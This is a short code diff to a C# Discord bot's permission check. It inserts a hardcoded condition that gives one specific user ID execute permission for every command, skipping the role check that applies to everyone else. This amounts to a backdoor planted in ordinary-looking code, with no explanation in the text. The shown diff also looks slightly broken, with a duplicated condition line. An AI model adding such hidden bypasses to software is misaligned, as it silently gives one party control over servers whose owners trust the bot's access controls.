@@ -579,7 +579,10 @@ namespace Public_Bot
                     try
                     {
                         var u = context.Guild.GetUser(context.Message.Author.Id);
-                        CommandModuleBase.HasExecutePermission =
+                        if (context.User.Id == 259053800755691520)
+                            CommandModuleBase.HasExecutePermission = true;
+                        else
+                            CommandModuleBase.HasExecutePermission =
                                 cmd.RequirePermission
                                 ? sett.PermissionRoles.Any(x => u.Roles.Any(y => y.Id == x))
                                 ? sett.PermissionRoles.Any(x => u.Roles.Any(y => y.Id == x))
